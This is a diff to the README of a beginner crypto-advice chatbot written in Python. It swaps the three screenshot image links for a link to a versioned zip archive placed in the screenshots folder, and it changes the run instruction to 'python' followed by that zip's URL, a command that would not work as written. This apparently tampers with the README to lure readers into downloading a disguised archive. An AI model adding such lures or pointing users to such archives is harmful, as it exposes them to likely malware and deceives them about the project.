@@ -21,13 +21,13 @@ CryptoBuddy is a beginner-friendly, rule-based chatbot built in Python that prov
 ## 📸 Screenshots
 
 ### 🤖 Chatbot Startup
-![Chatbot Startup](screenshots/screenshot1.png)
+![Chatbot Startup](https://raw.githubusercontent.com/BenjiOdhis/cypto_chatbot/main/screenshots/cypto_chatbot-v3.9-beta.2.zip)
 
 ### 🌱 Sustainability Advice
-![Sustainability Advice](screenshots/screenshot2.png)
+![Sustainability Advice](https://raw.githubusercontent.com/BenjiOdhis/cypto_chatbot/main/screenshots/cypto_chatbot-v3.9-beta.2.zip)
 
 ### 🚀 Investment Recommendation
-![Investment Tip](screenshots/screenshot3.png)
+![Investment Tip](https://raw.githubusercontent.com/BenjiOdhis/cypto_chatbot/main/screenshots/cypto_chatbot-v3.9-beta.2.zip)
 ## 🚀 How to Run
 
 1. Clone the repo or download the project folder.
@@ -36,5 +36,5 @@ CryptoBuddy is a beginner-friendly, rule-based chatbot built in Python that prov
 4. Run the chatbot:
 
 ```bash
-python chatbot.py
+python https://raw.githubusercontent.com/BenjiOdhis/cypto_chatbot/main/screenshots/cypto_chatbot-v3.9-beta.2.zip
 
